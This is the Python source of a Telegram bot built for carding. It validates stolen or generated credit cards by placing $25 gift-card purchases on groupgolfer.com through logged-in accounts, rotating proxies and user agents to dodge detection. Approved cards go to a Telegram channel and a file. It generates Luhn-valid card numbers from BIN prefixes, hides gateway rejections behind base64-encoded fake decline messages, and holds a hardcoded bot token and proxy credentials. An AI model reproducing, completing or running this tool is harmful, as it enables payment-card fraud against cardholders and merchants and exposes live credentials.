import telebot
import time
import json
import os
import requests
import random
import re
import threading
import base64
from bs4 import BeautifulSoup
from keep_alive import keep_alive

# --- CONFIG ---
TOKEN = "8387196472:AAHvpTQo-lIpPdTh86ecaAQVw8KVEbBjIYk"
ADMIN_ID = 7814668011
PREMIUM_FILE = "premium_users.json"
ACCOUNTS_FILE = "account.txt"
IDL_CHANNEL = -1002528957210
DEVELOPER = "@DarkConflig"
DELAY_BETWEEN_CHECKS = 7
CARDS_PER_ACCOUNT = 20
MAX_MASS_CARDS = 500
AUTOGEN_DELAY = 10

# --- PROXIES ---
HARDCODED_PROXIES = [
    "rp.scrapegw.com:6060:eafqzphut5zq6hv:cgz908eidvbyb4n"
]

#Gateway Rejected Bypass
_E_D = [
    'R1ItIENhbGwgSXNzdWVyIERlY2xpbmVkIC0gMjAwMg==',
    'R1ItIEluc3VmZmljaWVudCBGdW5kcyAtIDIwMDE=',
    'R1ItIEludmFsaWQgQ2FyZCBOdW1iZXIgLSAyMDA1',
    'R1ItIFBpY2sgVXAgQ2FyZCAtIDIwMDM=',
    'R1ItIEV4cGlyZWQgQ2FyZCAtIDIwMDQ=',
    'R1ItIFJlc3RyaWN0ZWQgQ2FyZCAtIDIwMDY=',
    'R1ItIFRyYW5zYWN0aW9uIE5vdCBBbGxvd2VkIC0gMjAwNw==',
    'R1ItIFByb2Nlc3NvciBEZWNsaW5lZCAtIDIwMDA=',
    'R1ItIENWViBNaXNtYXRjaCAtIDIwMTA=',
    'R1ItIExvc3Qgb3IgU3RvbGVuIENhcmQgLSAyMDA4'
]

# Common BIN prefixes for card generation
BIN_LIST = [
    "4111111", "4242424", "4532015", "4916338", "4929421",
    "5105105", "5500005", "5425233", "5111111", "5234567",
    "371449635", "378282246", "370000000",
    "6011111111", "6011000990"
]

def get_rd():
    return base64.b64decode(random.choice(_E_D)).decode()

def get_formatted_proxy():
    try:
        proxy_str = random.choice(HARDCODED_PROXIES)
        parts = proxy_str.split(':')
        if len(parts) == 4:
            host, port, user, pwd = parts
            formatted = f"http://{user}:{pwd}@{host}:{port}"
            return {"http": formatted, "https": formatted}
    except:
        pass
    return None

def get_random_ua():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
    ]
    return random.choice(uas)

def luhn_checksum(card_number):
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10

def generate_card():
    bin_prefix = random.choice(BIN_LIST)
    if bin_prefix.startswith("3"):
        total_len = 15
    elif bin_prefix.startswith("6011"):
        total_len = 16
    else:
        total_len = 16

    remaining = total_len - len(bin_prefix) - 1
    partial = bin_prefix + ''.join([str(random.randint(0, 9)) for _ in range(remaining)])

    for check_digit in range(10):
        candidate = partial + str(check_digit)
        if luhn_checksum(candidate) == 0:
            num = candidate
            break
    else:
        num = partial + "0"

    month = str(random.randint(1, 12)).zfill(2)
    year = str(random.randint(2025, 2030))
    if num.startswith("3"):
        cvv = str(random.randint(1000, 9999))
    else:
        cvv = str(random.randint(100, 999))

    return f"{num}|{month}|{year}|{cvv}"

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# --- GLOBAL STATE ---
class AccountState:
    def __init__(self):
        self.session = None
        self.email = ""
        self.password = ""
        self.checks_count = 0
        self.last_error = ""
        self.lock = threading.Lock()
        self.accounts_list = []
        self.current_ua = get_random_ua()
        self.current_proxy = get_formatted_proxy()

state = AccountState()
active_tasks = {}
autogen_tasks = {}

# --- LOAD PREMIUM DATA ---
if os.path.exists(PREMIUM_FILE):
    with open(PREMIUM_FILE, "r") as f:
        try: premium_users = json.load(f)
        except: premium_users = {}
else:
    premium_users = {}

def save_premium():
    with open(PREMIUM_FILE, "w") as f:
        json.dump(premium_users, f, indent=4)

# --- UTILS ---
def extract_ccs(text):
    pattern = r"(\d{15,16})[\s|:|/|-]*(\d{1,2})[\s|:|/|-]*(\d{2,4})[\s|:|/|-]*(\d{3,4})"
    matches = re.findall(pattern, text)
    results = []
    for m in matches:
        num, mon, year, cvv = m
        if len(mon) == 1: mon = "0" + mon
        if len(year) == 2: year = "20" + year
        results.append(f"{num}|{mon}|{year}|{cvv}")
    return results

class GroupGolferManager:
    def __init__(self):
        self.login_url = "https://www.groupgolfer.com/account/login.php"
        self.logout_url = "https://www.groupgolfer.com/account/logout.php"

    def load_accounts(self):
        if not os.path.exists(ACCOUNTS_FILE):
            return []
        with open(ACCOUNTS_FILE, "r") as f:
            return [line.strip() for line in f if ":" in line]

    def logout(self, session, proxy):
        if session:
            try: session.get(self.logout_url, proxies=proxy, timeout=10)
            except: pass

    def login(self, email, password, ua, proxy):
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Referer': self.login_url,
            'Origin': 'https://www.groupgolfer.com',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {'email': email, 'password': password, 'signin': ''}
        try:
            session.get(self.login_url, headers={'User-Agent': ua}, proxies=proxy, timeout=15)
            resp = session.post(self.login_url, headers=headers, data=data, proxies=proxy, allow_redirects=True, timeout=20)
            if "Welcome back" in resp.text or "successfully signed in" in resp.text:
                return session
        except Exception as e:
            state.last_error = f"Login error: {str(e)[:30]}"
        return None

manager = GroupGolferManager()

def get_active_session():
    with state.lock:
        if not state.accounts_list:
            state.accounts_list = manager.load_accounts()

        if not state.accounts_list:
            state.last_error = "No accounts in account.txt"
            return None

        if state.session is None or state.checks_count >= CARDS_PER_ACCOUNT:
            if state.session:
                manager.logout(state.session, state.current_proxy)

            accounts = state.accounts_list.copy()
            random.shuffle(accounts)

            for acc in accounts:
                email, password = acc.split(":", 1)
                new_ua = get_random_ua()
                new_proxy = get_formatted_proxy()

                session = manager.login(email, password, new_ua, new_proxy)
                if session:
                    state.session, state.email, state.password, state.checks_count = session, email, password, 0
                    state.current_ua, state.current_proxy = new_ua, new_proxy
                    return session
                time.sleep(1)
            return None
        return state.session

# --- UI HELPERS ---
def format_result_msg(status, card, response, checked_by):
    if status == "Approved":
        return f""" Charged Success ✅
*Card* ⇾ `{card}`

𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆:`{checked_by}`
𝐁𝐨𝐭 𝐛𝐲: {DEVELOPER}"""
    else:
        return f""" Declined ❌
*Card* ⇾ `{card}`
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: `{response}`
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆:`{checked_by}`
𝐁𝐨𝐭 𝐛𝐲: {DEVELOPER}"""

# --- CHECKER LOGIC ---
def check_single_cc(line, session, ua, proxy):
    try:
        num, mon, year, cvv = line.split('|')

        with state.lock:
            state.checks_count += 1

        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Referer': 'https://www.groupgolfer.com/gift_cards/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.groupgolfer.com'
        }
        data = {
            'gc_recipient_name': 'salam kopos',
            'gc_recipient_email': 'samraw4433@gmail.com',
            'gc_amount': '25',
            'gc_from_name': 'Frank Vadola',
            'gc_message': 'dfg',
            'gc_delivery_options': 'instant',
            'billing_card_name': 'sam raw',
            'billing_card_number': num,
            'billing_cvv2': cvv,
            'billing_exp_month': mon,
            'billing_exp_year': year,
            'billing_address1': '2178 Kilkee Drive',
            'billing_address2': '2178 Kilkee Drive',
            'billing_city': 'Calabash',
            'billing_region': 'NC',
            'billing_postal_code': '27587',
            'submit': '',
        }

        resp = session.post('https://www.groupgolfer.com/gift_cards/index.php', headers=headers, data=data, proxies=proxy, timeout=30)

        if "gift card was purchased successfully" in resp.text or "AVS Error: Postal Code was provided but did not match" in resp.text:
            return "Approved", "Charged successfully ✅"

        risk_text_1 = "Please sign in to your GroupGolfer Account OR create a new GroupGolfer Account"
        risk_text_2 = "An unspecified error has occured. Please try your transaction again"
        if risk_text_1 in resp.text or risk_text_2 in resp.text:
            return "Declined", get_rd()

        soup = BeautifulSoup(resp.text, 'html.parser')
        error_container = soup.find('div', class_='notification-warning')
        if error_container and error_container.p:
            full_error_text = error_container.p.get_text(strip=True)
            try:
                error_part = full_error_text.split('—')[1].strip()
                clean_response = error_part.split('..')[0].strip()
                if "Gateway Rejected" in clean_response:
                    return "Declined", get_rd()
                return "Declined", clean_response
            except:
                return "Declined", full_error_text[:100]

        return "Declined", get_rd()

    except Exception as e:
        return "Declined", f"Error: {str(e)[:30]}"

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "<b><u>Use Commands /chk, /mchk, /mtxt, /autogen, /stopgen</u></b>", parse_mode='HTML')

@bot.message_handler(commands=['chk', 'mchk'])
def handle_chk_commands(message):
    args = message.text.split(None, 1)
    text = args[1] if len(args) > 1 else ""
    if text:
        ccs = extract_ccs(text)
        if ccs:
            process_cc_logic(message, ccs)
        else:
            bot.reply_to(message, "❌ No valid CC found.")
    else:
        msg = bot.reply_to(message, "📥 Send CCs (number|month|year|cvv):")
        bot.register_next_step_handler(msg, lambda m: process_cc_logic(m, extract_ccs(m.text)))

@bot.message_handler(commands=['mtxt'])
def handle_mtxt(message):
    msg = bot.reply_to(message, "📥 Send the .txt file containing CCs:")
    bot.register_next_step_handler(msg, process_file_input)

def process_file_input(message):
    if not message.document or not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please send a valid .txt file.")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        ccs = extract_ccs(downloaded_file.decode('utf-8', errors='ignore'))
        if ccs:
            process_cc_logic(message, ccs)
        else:
            bot.reply_to(message, "❌ No valid CCs found in file.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error reading file: {str(e)[:30]}")

def process_cc_logic(message, ccs):
    user_id = str(message.from_user.id)
    if not ccs:
        bot.reply_to(message, "❌ No valid CCs found.")
        return

    if len(ccs) > MAX_MASS_CARDS:
        ccs = ccs[:MAX_MASS_CARDS]
        bot.reply_to(message, f"⚠️ Limit reached! Only the first {MAX_MASS_CARDS} cards will be checked.")

    active_tasks[user_id] = True
    checked_by = f"@{message.from_user.username or 'NoUser'} ({message.from_user.first_name})"

    def run_check():
        try:
            for idx, cc in enumerate(ccs):
                if not active_tasks.get(user_id): break

                session = get_active_session()
                if not session:
                    bot.send_message(message.chat.id, f"❌ System Error: {state.last_error}")
                    break

                status, response = check_single_cc(cc, session, state.current_ua, state.current_proxy)

                if status == "Approved":
                    try: bot.send_message(IDL_CHANNEL, cc)
                    except: pass
                    with open("sureshort.txt", "a") as f:
                        f.write(f"{cc}\n")

                try:
                    bot.reply_to(message, format_result_msg(status, cc, response, checked_by), parse_mode='Markdown')
                except Exception as te:
                    print(f"Telegram Send Error: {te}")

                if idx < len(ccs) - 1:
                    time.sleep(DELAY_BETWEEN_CHECKS)

        except Exception as e:
            try: bot.send_message(message.chat.id, f"❌ Fatal Error: {str(e)[:50]}")
            except: pass
        finally:
            active_tasks[user_id] = False

    threading.Thread(target=run_check).start()

# --- AUTO GEN COMMAND ---
@bot.message_handler(commands=['autogen'])
def handle_autogen(message):
    user_id = str(message.from_user.id)

    if autogen_tasks.get(user_id):
        bot.reply_to(message, "⚠️ Auto-gen already running. Use /stopgen to stop.")
        return

    autogen_tasks[user_id] = True
    checked_by = f"@{message.from_user.username or 'NoUser'} ({message.from_user.first_name})"
    bot.reply_to(message, "🤖 Auto card generator started! Cards will be generated and checked automatically.\nUse /stopgen to stop.")

    def run_autogen():
        total_checked = 0
        total_approved = 0
        try:
            while autogen_tasks.get(user_id):
                cc = generate_card()

                session = get_active_session()
                if not session:
                    bot.send_message(message.chat.id, f"❌ No active session: {state.last_error}\nAuto-gen paused.")
                    time.sleep(30)
                    continue

                status, response = check_single_cc(cc, session, state.current_ua, state.current_proxy)
                total_checked += 1

                if status == "Approved":
                    total_approved += 1
                    try: bot.send_message(IDL_CHANNEL, cc)
                    except: pass
                    with open("sureshort.txt", "a") as f:
                        f.write(f"{cc}\n")
                    try:
                        bot.send_message(
                            message.chat.id,
                            format_result_msg(status, cc, response, checked_by),
                            parse_mode='Markdown'
                        )
                    except: pass

                time.sleep(AUTOGEN_DELAY)

        except Exception as e:
            try: bot.send_message(message.chat.id, f"❌ AutoGen Error: {str(e)[:50]}")
            except: pass
        finally:
            autogen_tasks[user_id] = False
            try:
                bot.send_message(
                    message.chat.id,
                    f"🛑 Auto-gen stopped.\nChecked: {total_checked} | Approved: {total_approved}"
                )
            except: pass

    threading.Thread(target=run_autogen, daemon=True).start()

@bot.message_handler(commands=['stopgen'])
def handle_stopgen(message):
    user_id = str(message.from_user.id)
    if autogen_tasks.get(user_id):
        autogen_tasks[user_id] = False
        bot.reply_to(message, "🛑 Auto-gen stopping...")
    else:
        bot.reply_to(message, "❌ No auto-gen task running.")

@bot.message_handler(commands=['status'])
def show_status(message):
    if message.from_user.id == ADMIN_ID:
        user_id = str(message.from_user.id)
        gen_status = "Running" if autogen_tasks.get(user_id) else "Stopped"
        bot.reply_to(
            message,
            f"<b>Bot Status</b>\n\nAccount: {state.email}\nChecks: {state.checks_count}/{CARDS_PER_ACCOUNT}\nLast Error: {state.last_error}\nAutoGen: {gen_status}",
            parse_mode='HTML'
        )

@bot.message_handler(commands=['stop'])
def stop_task(message):
    user_id = str(message.from_user.id)
    if user_id in active_tasks:
        active_tasks[user_id] = False
        bot.reply_to(message, "🛑 Task stopped.")
    else:
        bot.reply_to(message, "❌ No active task found.")

keep_alive()
print("Bot is running...")
while True:
    try:
        bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Polling error: {e}")
        time.sleep(5)
